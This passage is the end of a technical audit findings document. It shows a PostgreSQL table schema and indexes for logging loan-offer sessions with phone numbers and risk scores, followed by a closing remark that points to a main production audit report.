    id SERIAL PRIMARY KEY,
    session_id UUID UNIQUE NOT NULL,
    logged_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    phone TEXT NOT NULL,
    room_url TEXT,
    campaign_id TEXT,
    loan_type TEXT,
    risk_band VARCHAR(20),
    risk_score INT,
    offer_status VARCHAR(20),
    payload_json JSONB NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_session_logged_at ON audit_sessions(logged_at DESC);
CREATE INDEX idx_session_risk ON audit_sessions(risk_band, risk_score);
CREATE INDEX idx_session_offer ON audit_sessions(offer_status);
CREATE INDEX idx_session_phone ON audit_sessions(phone);
```

---

**End of Technical Findings Document**

This document should be used alongside the main Production Audit Report to understand specific code-level issues and recommended fixes.
